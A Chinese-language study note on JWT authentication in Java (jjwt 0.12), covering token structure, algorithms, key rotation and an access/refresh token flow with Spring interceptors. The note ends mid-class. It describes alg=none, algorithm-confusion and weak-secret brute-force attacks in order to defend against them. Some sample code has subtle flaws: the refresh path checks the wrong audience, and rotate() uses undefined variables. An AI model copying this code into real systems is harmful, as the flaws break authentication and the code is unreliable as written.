---
title: "JWT认证与Web安全"
aliases:
  - "JWT"
  - "JSON Web Token"
  - "XSS CSRF"
tags:
  - "后端"
  - "java"
  - "javaweb"
  - "安全"
  - "面试"
category: "后端"
folder: "JavaWeb"
parent: "[[后端/Java/Java学习笔记总索引]]"
related:
  - "[[后端/JavaWeb/Filter-Listener与会话管理]]"
  - "[[后端/JavaWeb/Web基础与HTTP协议]]"
  - "[[后端/SpringBoot/整合Web开发]]"
  - "[[后端/中间件/Redis在Java项目中的整合]]"
created: 2026-09-07
updated: 2026-09-07
---

# JWT 认证与 Web 安全

## 1. 认证与授权

| 概念 | 英文 | 含义 | 失败状态码 |
| --- | --- | --- | --- |
| **认证** | Authentication | **你是谁**（验证身份） | **401** Unauthorized |
| **授权** | Authorization | **你能做什么**（验证权限） | **403** Forbidden |

```
认证方式演进：
① HTTP Basic Auth      → Authorization: Basic base64(user:pwd)   每次都传明文密码（Base64 非加密！）
② Cookie + Session     → 服务端存状态，客户端存 SessionID          有状态，分布式麻烦
③ ★ JWT Token          → 客户端存自包含的令牌，服务端验签即可       无状态，分布式友好
④ OAuth 2.0            → 第三方授权（微信登录、GitHub 登录）        授权框架，非认证
⑤ OIDC（OpenID Connect）→ OAuth 2.0 + ID Token（JWT）             ★ 现代单点登录标准
```

## 2. JWT 结构与原理 ★★★★★

### 2.1 三段式结构

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 . eyJ1aWQiOjEwMDEsIm5hbWUiOiJUb20ifQ . 4v6mBdQ...签名
└────────── Header ──────────┘   └──────── Payload ────────┘   └── Signature ──┘
        Base64Url 编码                  Base64Url 编码              二进制（不编码）
        三段用 . 分隔，整体作为 Token
```

**① Header（头部）**

```json
{
  "alg": "HS256",        // ★ 签名算法（HS256/HS512/RS256/ES256/none）
  "typ": "JWT",          // 类型
  "kid": "key-2026-01"   // ★ 密钥 ID（密钥轮换时用，从 JWKS 中找对应公钥）
}
```

**② Payload（负载 / Claims）**

```json
{
  // ─── 注册声明（Registered Claims，7 个标准字段，全部可选）───
  "iss": "https://auth.example.com",   // issuer 签发者
  "sub": "1001",                        // subject 主题（通常是用户 ID）
  "aud": "mall-api",                    // audience 受众（哪个应用可用）
  "exp": 1788888888,                    // ★ expiration 过期时间（秒级时间戳）
  "nbf": 1788800000,                    // not before 生效时间（此前不可用）
  "iat": 1788800000,                    // issued at 签发时间
  "jti": "550e8400-e29b-41d4",          // ★ JWT ID 唯一标识（防重放、用于黑名单）

  // ─── 公共声明（Public Claims，需在 IANA 注册或避免冲突）───
  "name": "Tom",
  "email": "tom@example.com",

  // ─── 私有声明（Private Claims，业务自定义）★★★
  "uid": 1001,
  "username": "tom",
  "roles": ["ADMIN", "USER"],           // ★ 角色（授权用）
  "permissions": ["user:read", "user:write"],
  "deptId": 100,
  "tenantId": 1,
  "tokenType": "access"                 // ★ 区分 access / refresh token
}
```

> 【★ 核心警告】**Payload 只是 Base64Url 编码，不是加密！任何人都能解码看到内容。**
> ```java
> // 任何人拿到 Token 都能解码
> String payload = new String(Base64.getUrlDecoder().decode(token.split("\\.")[1]));
> // → {"uid":1001,"username":"tom","roles":["ADMIN"],...}
> ```
> **绝对不要在 Payload 中放：密码、身份证、手机号、银行卡、密钥、任何敏感信息。**
> JWT 的安全性来自**签名防篡改**，不是**加密防窥探**。需要加密用 **JWE**（JSON Web Encryption）。

**③ Signature（签名）**

```
Signature = HMACSHA256(
    base64UrlEncode(header) + "." + base64UrlEncode(payload),
    secret                                    // ★ 密钥（HS256 用对称密钥）
)
```

**签名的作用：防篡改（完整性校验），不是防窥探。**

```
攻击者尝试：
① 解码 Payload → 把 "roles":["USER"] 改成 "roles":["ADMIN"] → 重新编码
② 但没有密钥，无法生成正确的 Signature
③ 服务端验签失败 → 拒绝请求 ✅

如果 alg=none（★ 著名漏洞）：
① 攻击者把 Header 的 alg 改为 "none"，删掉 Signature
② 若服务端未校验 alg，会接受这个 Token → 完全绕过认证！
③ 防护：★ 服务端必须强制校验 alg 在白名单内，拒绝 none
```

### 2.2 签名算法对比 ★★★★★

| 算法 | 类型 | 密钥 | 性能 | 适用 |
| --- | --- | --- | --- | --- |
| **HS256**（HMAC-SHA256） | 对称 | 一个共享密钥（≥ 256 位） | **快** | ★ 单体应用、微服务内部（共享密钥） |
| HS384 / HS512 | 对称 | 384/512 位密钥 | 快 | 更高安全要求 |
| **RS256**（RSA-SHA256） | **非对称** | **私钥签名，公钥验签** | 慢（验签快） | ★★ **认证中心 + 多服务**（公钥可公开分发） |
| ES256（ECDSA-P256） | 非对称（椭圆曲线） | 密钥更短（256 位 ≈ RSA 3072 位） | **验签最快** | 移动端、性能敏感 |
| PS256（RSA-PSS） | 非对称 | 同 RS256 但填充更安全 | 慢 | 高安全要求 |
| **`none`** | ★ **无签名** | — | — | ❌ **绝不允许**（漏洞来源） |

**HS256 vs RS256 的选择（★ 高频面试）：**

| | HS256（对称） | RS256（非对称） |
| --- | --- | --- |
| 密钥数量 | 1 个（签发和验证同一个） | 2 个（私钥签发、公钥验证） |
| 密钥分发 | **困难**：所有验证方都要持有密钥 → 任一服务泄漏，攻击者可伪造 Token | ★ **容易**：公钥可公开（通过 JWKS 端点分发） |
| 适用架构 | 单体、可信的微服务集群 | ★ **认证中心（IdP）+ 多个资源服务** |
| 性能 | **签发和验证都快** | 签发慢（私钥运算），验证较快 |
| 密钥轮换 | 麻烦（要同步所有服务） | ★ 简单（JWKS 发布新公钥，`kid` 区分） |
| 典型场景 | 内部系统、Spring Security 默认 | **Keycloak、Auth0、Okta、微信/支付宝开放平台** |

```java
// ★ 著名的算法混淆攻击（Algorithm Confusion / Key Confusion）
// 攻击场景：服务端用 RS256（公钥验签），攻击者把 Token 的 alg 改为 HS256，
//          然后用「服务端的公钥」作为 HMAC 密钥来签名
//          → 如果服务端不校验 alg，会用公钥当 HMAC 密钥去验签 → 验签通过！★ 认证被绕过

// ✅ 防护：
// 1. 服务端【强制指定】期望的算法，忽略 Token 中的 alg
Jws<Claims> jws = Jwts.parser()
        .requireSignatureAlgorithm("RS256")            // ★ jjwt 0.12+ 强制指定
        .verifyWith(publicKey)
        .build()
        .parseSignedClaims(token);
// 2. 或用 jjwt/nimbus 的白名单校验
// 3. 绝不混用对称和非对称密钥（公钥不能泄漏给可能签发的地方）
```

## 3. Java 实现 JWT ★★★★★

### 3.1 主流库对比

| 库 | Maven 坐标 | 特点 |
| --- | --- | --- |
| **jjwt**（推荐） | `io.jsonwebtoken:jjwt-api/impl/jackson` | ★ API 优雅、功能全、社区活跃、安全默认值好 |
| **nimbus-jose-jwt** | `com.nimbusds:nimbus-jose-jwt` | 支持 JWE（加密）、JWK、OIDC，Spring Security OAuth2 底层用它 |
| java-jwt（Auth0） | `com.auth0:java-jwt` | 简单轻量 |
| hutool-jwt | `cn.hutool:hutool-jwt` | 国内工具库，API 简洁 |
| Spring Security | `spring-security-oauth2-jose` | 与 Security 深度集成 |

```xml
<!-- ★ jjwt（0.12.x，本篇基于此版本；0.11.x 的 API 不同） -->
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-api</artifactId>
    <version>0.12.6</version>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-impl</artifactId>
    <version>0.12.6</version>
    <scope>runtime</scope>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-jackson</artifactId>   <!-- 或 jjwt-gson / jjwt-orgjson -->
    <version>0.12.6</version>
    <scope>runtime</scope>
</dependency>
```

### 3.2 完整的 JWT 工具类实现

```java
package com.example.common.security;

import io.jsonwebtoken.*;
import io.jsonwebtoken.io.Decoders;
import io.jsonwebtoken.security.Keys;
import io.jsonwebtoken.security.SecurityException;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Component;

import javax.crypto.SecretKey;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.*;

/**
 * JWT 工具类（jjwt 0.12.x）
 * ★ 生产要点：密钥从配置中心/环境变量读取，不硬编码；密钥长度足够；异常分类处理
 */
@Slf4j
@Component
public class JwtUtils {

    /** ★ 密钥：HS256 要求至少 256 位（32 字节），太短会抛 WeakKeyException */
    private final SecretKey secretKey;
    private final String issuer;
    private final String audience;
    private final Duration accessTokenTtl;
    private final Duration refreshTokenTtl;

    public JwtUtils(
            @Value("${jwt.secret}") String secret,
            @Value("${jwt.issuer:myapp}") String issuer,
            @Value("${jwt.audience:myapp-api}") String audience,
            @Value("${jwt.access-token-ttl:30m}") Duration accessTokenTtl,
            @Value("${jwt.refresh-token-ttl:7d}") Duration refreshTokenTtl) {

        // ★ 支持 Base64 编码的密钥（推荐，避免特殊字符问题）
        byte[] keyBytes = secret.startsWith("base64:")
                ? Decoders.BASE64.decode(secret.substring(6))
                : secret.getBytes(StandardCharsets.UTF_8);

        if (keyBytes.length < 32) {
            throw new IllegalArgumentException("JWT 密钥长度不足 32 字节（HS256 要求 ≥ 256 位），当前 " + keyBytes.length);
        }
        this.secretKey = Keys.hmacShaKeyFor(keyBytes);      // ★ 自动根据长度选择 HS256/384/512
        this.issuer = issuer;
        this.audience = audience;
        this.accessTokenTtl = accessTokenTtl;
        this.refreshTokenTtl = refreshTokenTtl;
    }

    // ══════════════ 生成 Token ══════════════

    /** 生成 Access Token */
    public String createAccessToken(LoginUser user) {
        Date now = new Date();
        return Jwts.builder()
                // ─── Header ───
                .header()
                    .type("JWT")
                    .keyId(currentKeyId())                    // ★ 密钥 ID（轮换用）
                    .and()
                // ─── 注册声明 ───
                .id(UUID.randomUUID().toString().replace("-", ""))   // ★ jti（唯一 ID，防重放/黑名单用）
                .issuer(issuer)                                        // iss
                .subject(String.valueOf(user.getUserId()))              // ★ sub = 用户 ID
                .audience().add(audience).and()                        // aud
                .issuedAt(now)                                          // iat
                .notBefore(now)                                         // nbf
                .expiration(Date.from(now.toInstant().plus(accessTokenTtl)))   // ★ exp
                // ─── 私有声明（★ 只放非敏感的授权信息）───
                .claim("uid", user.getUserId())
                .claim("username", user.getUsername())
                .claim("nickname", user.getNickname())
                .claim("roles", user.getRoles())                        // ["ADMIN","USER"]
                .claim("deptId", user.getDeptId())
                .claim("tokenType", "access")
                // ─── 签名 ───
                .signWith(secretKey, Jwts.SIG.HS256)                    // ★ 显式指定算法
                .compact();
    }

    /** 生成 Refresh Token（★ 内容更少，有效期更长） */
    public String createRefreshToken(Long userId, String jti) {
        Date now = new Date();
        return Jwts.builder()
                .id(jti)
                .issuer(issuer)
                .subject(String.valueOf(userId))
                .audience().add(audience + "-refresh").and()
                .issuedAt(now)
                .expiration(Date.from(now.toInstant().plus(refreshTokenTtl)))
                .claim("tokenType", "refresh")                          // ★ 区分类型，防止 refresh 当 access 用
                .signWith(secretKey, Jwts.SIG.HS256)
                .compact();
    }

    /** 一次性生成双 Token */
    public TokenPair createTokenPair(LoginUser user) {
        String refreshJti = UUID.randomUUID().toString().replace("-", "");
        String access = createAccessToken(user);
        String refresh = createRefreshToken(user.getUserId(), refreshJti);
        return new TokenPair(access, refresh, refreshJti,
                accessTokenTtl.toSeconds(), refreshTokenTtl.toSeconds());
    }

    public record TokenPair(String accessToken, String refreshToken,
                            String refreshJti, long expiresIn, long refreshExpiresIn) { }

    // ══════════════ 解析与校验 ══════════════

    /**
     * ★ 解析并校验 Token（一步完成：格式、签名、过期、iss、aud）
     * @throws JwtException 各种校验失败
     */
    public Claims parseToken(String token) {
        return Jwts.parser()
                // ─── ★ 安全配置（每一项都很重要）───
                .verifyWith(secretKey)                                  // ① 验签密钥
                .requireIssuer(issuer)                                   // ② ★ 必须校验签发者
                .requireAudience(audience)                               // ③ ★ 必须校验受众
                .requireSignatureAlgorithm("HS256")                      // ④ ★★ 强制算法，防算法混淆攻击
                .clockSkewSeconds(60)                                    // ⑤ 时钟偏差容忍 60 秒（多服务器时钟不同步）
                .maxAllowedLimit(10 * 1024)                              // ⑥ Token 最大长度（防超大 Token 攻击）
                // ─── 解析 ───
                .build()
                .parseSignedClaims(token)                                // ★ parseSignedClaims 强制要求有签名
                .getPayload();                                           // 返回 Claims
    }

    /** 解析 Refresh Token（校验类型，防止用 refresh 冒充 access） */
    public Claims parseRefreshToken(String token) {
        Claims claims = Jwts.parser()
                .verifyWith(secretKey)
                .requireIssuer(issuer)
                .requireAudience(audience + "-refresh")                  // ★ 受众不同
                .requireSignatureAlgorithm("HS256")
                .build()
                .parseSignedClaims(token)
                .getPayload();
        if (!"refresh".equals(claims.get("tokenType", String.class))) {
            throw new JwtException("Token 类型错误");
        }
        return claims;
    }

    /** ★ 只解码不验签（用于错误提示、日志，不能用于鉴权！） */
    public Claims decodeWithoutVerify(String token) {
        return Jwts.parser().unsecured().build()
                .parseUnsecuredClaims(stripSignature(token)).getPayload();
    }
    private String stripSignature(String token) {
        String[] parts = token.split("\\.");
        return parts.length >= 2 ? parts[0] + "." + parts[1] + "." : token;
    }

    // ══════════════ 便捷方法 ══════════════

    /** 从 Token 中取用户 ID */
    public Long getUserId(String token) {
        return Long.valueOf(parseToken(token).getSubject());
    }

    /** 从 Token 中取自定义声明 */
    public <T> T getClaim(String token, String name, Class<T> type) {
        return parseToken(token).get(name, type);
    }

    @SuppressWarnings("unchecked")
    public List<String> getRoles(String token) {
        return parseToken(token).get("roles", List.class);
    }

    public String getJti(String token) { return parseToken(token).getId(); }

    /** 校验 Token 是否有效（不抛异常版本） */
    public boolean isValid(String token) {
        try {
            parseToken(token);
            return true;
        } catch (JwtException | IllegalArgumentException e) {
            log.debug("Token 无效：{}", e.getMessage());
            return false;
        }
    }

    /** ★ 异常分类（不同失败原因返回不同提示） */
    public JwtValidationResult validate(String token) {
        try {
            Claims claims = parseToken(token);
            return JwtValidationResult.success(claims);
        } catch (ExpiredJwtException e) {                       // ★ 过期（前端据此触发刷新）
            return JwtValidationResult.expired(e.getClaims());
        } catch (UnsupportedJwtException e) {                   // 格式不支持（如 alg=none）
            return JwtValidationResult.invalid("不支持的 Token 格式");
        } catch (MalformedJwtException e) {                     // 格式错误（不是三段、Base64 解析失败）
            return JwtValidationResult.invalid("Token 格式错误");
        } catch (SecurityException e) {                         // ★ 签名错误（被篡改！）
            log.warn("检测到 Token 签名校验失败，可能被篡改：{}", e.getMessage());
            return JwtValidationResult.invalid("Token 签名无效");
        } catch (LimitExceededException e) {                    // 超过长度/嵌套限制
            return JwtValidationResult.invalid("Token 超出限制");
        } catch (IllegalArgumentException e) {                  // 参数为空
            return JwtValidationResult.invalid("Token 为空");
        }
    }

    public record JwtValidationResult(boolean valid, boolean expired, String message, Claims claims) {
        static JwtValidationResult success(Claims c) { return new JwtValidationResult(true, false, null, c); }
        static JwtValidationResult expired(Claims c) { return new JwtValidationResult(false, true, "登录已过期", c); }
        static JwtValidationResult invalid(String msg) { return new JwtValidationResult(false, false, msg, null); }
    }

    private String currentKeyId() { return "key-" + secretKey.getAlgorithm(); }
}
```

```yaml
# application.yml
jwt:
  # ★★ 生产环境从环境变量/配置中心读取，绝不硬编码到代码库！
  # 生成强密钥：openssl rand -base64 48
  secret: ${JWT_SECRET:base64:your-256-bit-secret-key-at-least-32-bytes-long...}
  issuer: myapp
  audience: myapp-api
  access-token-ttl: 30m          # ★ Access Token 短（30 分钟）
  refresh-token-ttl: 7d          # ★ Refresh Token 长（7 天）
  header: Authorization
  prefix: "Bearer "
```

> 【坑】**jjwt 0.12.x 与 0.11.x 的 API 差异**（升级时会踩）：
> | 0.11.x | 0.12.x |
> | --- | --- |
> | `Jwts.parserBuilder()` | `Jwts.parser()` |
> | `.setSigningKey(key)` | `.verifyWith(key)` |
> | `.setClaims(claims)` | `.claims(claims)` |
> | `.setSubject(x)` | `.subject(x)` |
> | `.setExpiration(d)` | `.expiration(d)` |
> | `.signWith(key, SignatureAlgorithm.HS256)` | `.signWith(key, Jwts.SIG.HS256)` |
> | `.parseClaimsJws(token)` | `.parseSignedClaims(token)` |
> | `.getBody()` | `.getPayload()` |
> | `.setAudience(x)` | `.audience().add(x).and()` |

### 3.3 密钥的安全管理 ★★★★★

```java
// ─── ❌ 反面教材 ───
private static final String SECRET = "123456";                    // ★ 弱密钥，可被暴力破解
private static final String SECRET = "mySecretKey";                // ★ 硬编码在代码中（进了 Git 历史）
// HS256 的密钥如果太短/太简单，攻击者可以用 hashcat/jwt-cracker 离线暴力破解：
//   拿到 Token → 用字典/规则生成候选密钥 → 计算 HMAC 比对签名 → 破解成功后即可伪造任意 Token

// ─── ✅ 正确做法 ───
// ① 密钥长度：HS256 ≥ 256 位（32 字节），HS512 ≥ 512 位（64 字节）
//    生成命令：
//    openssl rand -base64 48              # 生成 48 字节随机密钥（Base64）
//    openssl rand -hex 32                 # 生成 32 字节（16 进制 64 字符）
//    Java: Keys.secretKeyFor(Jwts.SIG.HS256)   // jjwt 自动生成合规密钥

// ② 密钥存储（按安全性从低到高）：
//    a. 环境变量（容器化标配）
//    b. 配置中心（Nacos/Apollo，配合加密存储）
//    c. ★ 密钥管理服务（KMS：阿里云 KMS、AWS KMS、HashiCorp Vault）
//    d. 硬件安全模块（HSM）

// ③ 密钥轮换（Key Rotation）★★★
// 问题：密钥泄漏或定期安全要求需要更换，但已签发的 Token 还在有效期内
// 方案：多密钥共存 + kid 标识
@Component
public class RotatingJwtKeyProvider {
    /** keyId → Key 的映射（保留新旧密钥） */
    private final Map<String, SecretKey> keys = new ConcurrentHashMap<>();
    private volatile String currentKeyId;

    /** 签发：用当前密钥 */
    public SecretKey signingKey() { return keys.get(currentKeyId); }
    public String currentKeyId() { return currentKeyId; }

    /** 验签：按 Token Header 中的 kid 选择密钥（★ 支持旧 Token） */
    public SecretKey verificationKey(String keyId) {
        SecretKey key = keys.get(keyId);
        if (key == null) throw new JwtException("未知的密钥 ID: " + keyId);
        return key;
    }

    /** 轮换：加载新密钥，保留旧密钥直到旧 Token 全部过期 */
    public void rotate(String newKeyId, SecretKey newKey) {
        keys.put(newKeyId, newKey);
        this.currentKeyId = newKeyId;
        // 旧密钥在 maxTokenTtl 之后移除
        scheduler.schedule(() -> keys.remove(oldKeyId), maxTokenTtl);
    }
}

// jjwt 支持通过 Locator 动态选择密钥
Jwts.parser()
    .keyLocator(new Locator<Key>() {
        @Override
        public Key locate(Header header) {
            String kid = header.getKeyId();                    // ★ 从 Header 取 kid
            return keyProvider.verificationKey(kid);
        }
    })
    .build()
    .parseSignedClaims(token);

// ④ RS256 方案：公钥通过 JWKS 端点公开分发（★ 业界标准）
// GET /.well-known/jwks.json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "key-2026-01",
      "use": "sig",
      "alg": "RS256",
      "n": "0vx7agoebGcQSuu...(modulus)",
      "e": "AQAB"
    },
    { "kid": "key-2025-12", ... }       // ★ 旧密钥保留，支持未过期的旧 Token
  ]
}
// 各资源服务启动时/定期从认证中心拉取 JWKS，缓存公钥 → 本地验签，无需网络请求
```

## 4. JWT 的完整认证流程 ★★★★★

### 4.1 双 Token 机制（Access + Refresh）

**为什么要两个 Token？**

| | Access Token | Refresh Token |
| --- | --- | --- |
| 有效期 | **短**（15~30 分钟） | **长**（7~30 天） |
| 用途 | 访问业务 API | **只用于换取新的 Access Token** |
| 传输频率 | 每个请求都带 | 仅在 Access 过期时用一次 |
| 存储 | 内存（Tab 级）/ localStorage | ★ **HttpOnly Cookie**（更安全） |
| 泄漏风险 | 高（频繁传输） | 低（很少传输） |
| 泄漏损失 | **小**（很快过期） | 大（需要服务端撤销机制） |

```
┌─────────┐                                    ┌──────────────┐
│  客户端   │                                    │   服务端       │
└────┬────┘                                    └──────┬───────┘
     │  ① POST /auth/login {username, password}         │
     ├─────────────────────────────────────────────────→│
     │                                                   │ 校验密码
     │                                                   │ 生成 Access(30m) + Refresh(7d)
     │                                                   │ ★ Refresh 的 jti 存入 Redis（白名单）
     │  ② 200 {accessToken, expiresIn, refreshToken}     │
     │     Set-Cookie: refresh_token=xxx; HttpOnly       │
     │←─────────────────────────────────────────────────┤
     │                                                   │
     │  ③ GET /api/orders                                │
     │     Authorization: Bearer <accessToken>           │
     ├─────────────────────────────────────────────────→│
     │                                                   │ 验签（本地，无需查 Redis）★ 无状态
     │  ④ 200 {data: [...]}                              │
     │←─────────────────────────────────────────────────┤
     │                                                   │
     │  ... 30 分钟后 ...                                 │
     │  ⑤ GET /api/orders                                │
     ├─────────────────────────────────────────────────→│
     │  ⑥ ★ 401 {code: 40101, message: "token expired"} │
     │←─────────────────────────────────────────────────┤
     │                                                   │
     │  ⑦ POST /auth/refresh                             │
     │     Cookie: refresh_token=xxx（自动带上）           │
     ├─────────────────────────────────────────────────→│
     │                                                   │ 验签 + ★ 校验 Redis 中 jti 是否存在
     │                                                   │ 生成新 Access（可选：Refresh 也轮换）
     │  ⑧ 200 {accessToken, expiresIn}                   │
     │←─────────────────────────────────────────────────┤
     │                                                   │
     │  ⑨ 重放之前失败的请求（前端自动）                     │
     ├─────────────────────────────────────────────────→│
```

### 4.2 完整实现（Controller + 拦截器 + Redis）

```java
// ─── 1. 认证 Controller ───
@RestController
@RequestMapping("/auth")
@RequiredArgsConstructor
@Slf4j
public class AuthController {

    private final AuthService authService;
    private final JwtUtils jwtUtils;
    private final TokenBlacklistService blacklistService;

    /** 登录 */
    @PostMapping("/login")
    public Result<TokenVO> login(@RequestBody @Valid LoginDTO dto,
                                HttpServletRequest request,
                                HttpServletResponse response) {
        // ① 认证（校验用户名密码）
        LoginUser user = authService.authenticate(dto.getUsername(), dto.getPassword(),
                                                  getClientIp(request));

        // ② 生成双 Token
        JwtUtils.TokenPair pair = jwtUtils.createTokenPair(user);

        // ③ ★ Refresh Token 的 jti 存入 Redis（白名单，支持主动撤销）
        blacklistService.saveRefreshToken(user.getUserId(), pair.refreshJti(),
                                          Duration.ofSeconds(pair.refreshExpiresIn()));

        // ④ ★ Refresh Token 放 HttpOnly Cookie（防 XSS 窃取）
        ResponseCookie cookie = ResponseCookie.from("refresh_token", pair.refreshToken())
                .httpOnly(true)                          // ★ JS 无法读取
                .secure(true)                            // ★ 只走 HTTPS
                .sameSite("Strict")                      // ★ 防 CSRF（只允许同站请求）
                .path("/auth/refresh")                   // ★ 只在这个路径发送（最小化暴露）
                .maxAge(Duration.ofSeconds(pair.refreshExpiresIn()))
                .build();
        response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());

        // ⑤ 只把 Access Token 返回给前端（放内存/localStorage）
        return Result.success(new TokenVO(pair.accessToken(), pair.expiresIn(),
                                          user.getUserId(), user.getUsername(), user.getRoles()));
    }

    /** 刷新 Token */
    @PostMapping("/refresh")
    public Result<TokenVO> refresh(@CookieValue(value = "refresh_token", required = false) String refreshToken,
                                  HttpServletRequest request) {
        if (!StringUtils.hasText(refreshToken)) {
            throw new BusinessException(ResultCode.UNAUTHORIZED, "缺少刷新令牌");
        }

        // ① 解析并校验 Refresh Token
        JwtUtils.JwtValidationResult result = jwtUtils.validate(refreshToken);
        if (!result.valid()) {
            // ★ Refresh Token 也失效 → 必须重新登录
            throw new BusinessException(ResultCode.TOKEN_EXPIRED, "登录已过期，请重新登录");
        }

        Claims claims = result.claims();
        Long userId = Long.valueOf(claims.getSubject());
        String jti = claims.getId();

        // ② ★ 校验 Redis 中是否存在（是否被主动撤销/登出）
        if (!blacklistService.isRefreshTokenValid(userId, jti)) {
            log.warn("Refresh Token 已被撤销，userId={}, jti={}", userId, jti);
            throw new BusinessException(ResultCode.UNAUTHORIZED, "登录状态已失效");
        }

        // ③ 加载用户最新信息（★ 重要：权限可能已变更）
        LoginUser user = authService.loadUser(userId);
        if (user == null || !user.isEnabled()) {
            throw new BusinessException(ResultCode.ACCOUNT_DISABLED);
        }

        // ④ ★ Refresh Token 轮换（Rotation）：生成新的，作废旧的（防重放）
        JwtUtils.TokenPair newPair = jwtUtils.createTokenPair(user);
        blacklistService.rotateRefreshToken(userId, jti, newPair.refreshJti(),
                                            Duration.ofSeconds(newPair.refreshExpiresIn()));

        // ⑤ 更新 Cookie
        setRefreshCookie(newPair.refreshToken(), newPair.refreshExpiresIn());

        return Result.success(new TokenVO(newPair.accessToken(), newPair.expiresIn(),
                                          user.getUserId(), user.getUsername(), user.getRoles()));
    }

    /** 登出 */
    @PostMapping("/logout")
    public Result<Void> logout(@RequestHeader("Authorization") String authHeader,
                              @CookieValue(value = "refresh_token", required = false) String refreshToken,
                              HttpServletResponse response) {
        // ① Access Token 加入黑名单（因为 JWT 无状态，不拉黑就还能用到过期）
        if (StringUtils.hasText(authHeader)) {
            String token = authHeader.replace("Bearer ", "");
            try {
                Claims claims = jwtUtils.parseToken(token);
                long remainTtl = claims.getExpiration().getTime() - System.currentTimeMillis();
                if (remainTtl > 0) {
                    blacklistService.blacklistAccessToken(claims.getId(), remainTtl);
                }
            } catch (JwtException e) {
                log.debug("登出时 Token 已失效：{}", e.getMessage());
            }
        }

        // ② 删除 Refresh Token（从 Redis 白名单移除）
        if (StringUtils.hasText(refreshToken)) {
            try {
                Claims claims = jwtUtils.parseRefreshToken(refreshToken);
                blacklistService.removeRefreshToken(Long.valueOf(claims.getSubject()), claims.getId());
            } catch (JwtException ignored) { }
        }

        // ③ ★ 清除 Cookie（maxAge=0）
        ResponseCookie cookie = ResponseCookie.from("refresh_token", "")
                .httpOnly(true).secure(true).sameSite("Strict")
                .path("/auth/refresh").maxAge(0).build();
        response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());

        return Result.success();
    }

    /** 获取当前用户信息（前端刷新页面时调用） */
    @GetMapping("/me")
    public Result<UserInfoVO> currentUser() {
        return Result.success(authService.getCurrentUser());
    }
}
```

```java
// ─── 2. JWT 认证拦截器 ───
@Slf4j
@Component
@RequiredArgsConstructor
public class JwtAuthInterceptor implements HandlerInterceptor {

    private final JwtUtils jwtUtils;
    private final TokenBlacklistService blacklistService;

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response,
                             Object handler) throws Exception {
        // ① 放行 CORS 预检
        if (CorsUtils.isPreFlightRequest(request)) return true;

        // ② 放行标注了 @IgnoreAuth 的接口
        if (handler instanceof HandlerMethod hm
                && (hm.hasMethodAnnotation(IgnoreAuth.class)
                    || hm.getBeanType().isAnnotationPresent(IgnoreAuth.class))) {
            return true;
        }

        // ③ 提取 Token
        String token = resolveToken(request);
        if (!StringUtils.hasText(token)) {
            writeError(response, ResultCode.UNAUTHORIZED, "未提供认证令牌");
            return false;
        }

        // ④ ★ 校验 Token（签名、过期、iss、aud、alg）
        JwtUtils.JwtValidationResult result = jwtUtils.validate(token);
        if (!result.valid()) {
            // ★ 区分「过期」和「无效」，前端据此决定是否尝试刷新
            ResultCode code = result.expired() ? ResultCode.TOKEN_EXPIRED : ResultCode.TOKEN_INVALID;
            writeError(response, code, result.message());
            return false;
        }

        // ⑤ ★ 校验黑名单（是否已登出/被踢）
        Claims claims = result.claims();
        if (blacklistService.isAccessTokenBlacklisted(claims.getId())) {
            writeError(response, ResultCode.UNAUTHORIZED, "令牌已失效，请重新登录");
            return false;
        }

        // ⑥ ★ 校验 Token 类型（防止 refresh token 当 access 用）
        if (!"access".equals(claims.get("tokenType", String.class))) {
            writeError(response, ResultCode.TOKEN_INVALID, "令牌类型错误");
            return false;
        }

        // ⑦ 构建登录上下文（放入 ThreadLocal）
        LoginUser user = LoginUser.builder()
                .userId(Long.valueOf(claims.getSubject()))
                .username(claims.get("username", String.class))
                .roles(claims.get("roles", List.class))
                .deptId(claims.get("deptId", Long.class))
                .build();
        UserContext.set(user);

        // ⑧ 可选：校验权限版本（管理员修改了用户权限，强制旧 Token 失效）
        //    Redis 中存 user:{id}:permVersion，Token 中带 permVersion，不一致则拒绝
        return true;
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response,
                                Object handler, Exception ex) {
        UserContext.clear();                       // ★★ 必须清理 ThreadLocal（防串号 + 内存泄漏）
    }

    /** 从多个位置提取 Token（Header 优先） */
    private String resolveToken(HttpServletRequest request) {
        // ① Authorization: Bearer xxx（★ 标准方式）
        String header = request.getHeader("Authorization");
        if (StringUtils.hasText(header) && header.startsWith("Bearer ")) {
            return header.substring(7).trim();
        }
        // ② 自定义头（部分网关/SDK 场景）
        String custom = request.getHeader("X-Access-Token");
        if (StringUtils.hasText(custom)) return custom;
        // ③ ★ URL 参数（仅用于特殊场景：文件下载、WebSocket 握手、EventSource）
        //    ⚠️ 有安全风险（会进日志、Referer、浏览器历史），仅在无法用 Header 时使用
        if (allowsTokenInParam(request)) {
            String param = request.getParameter("access_token");
            if (StringUtils.hasText(param)) return param;
        }
        return null;
    }

    /** 只有下载、WebSocket 等场景允许 URL 传 Token */
    private boolean allowsTokenInParam(HttpServletRequest request) {
        String uri = request.getRequestURI();
        return uri.contains("/download") || uri.startsWith("/ws");
    }

    private void writeError(HttpServletResponse response, ResultCode code, String msg) throws IOException {
        response.setStatus(code == ResultCode.UNAUTHORIZED ? 401 : 401);
        response.setContentType("application/json;charset=UTF-8");
        response.getWriter().write(JSON.toJSONString(Result.failed(code, msg)));
    }
}

// 注册拦截器
@Configuration
@RequiredArgsConstructor
public class WebMvcConfig implements WebMvcConfigurer {
    private final JwtAuthInterceptor jwtAuthInterceptor;

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(jwtAuthInterceptor)
                .addPathPatterns("/api/**")
                .excludePathPatterns(
                    "/api/auth/login", "/api/auth/refresh", "/api/auth/register",
                    "/api/public/**", "/error", "/favicon.ico",
                    "/doc.html", "/webjars/**", "/v3/api-docs/**");
    }
}
```

```java
// ─── 3. Token 黑名单服务（解决 JWT 无法主动失效的核心）───
@Service
@RequiredArgsConstructor
public class TokenBlacklistService {

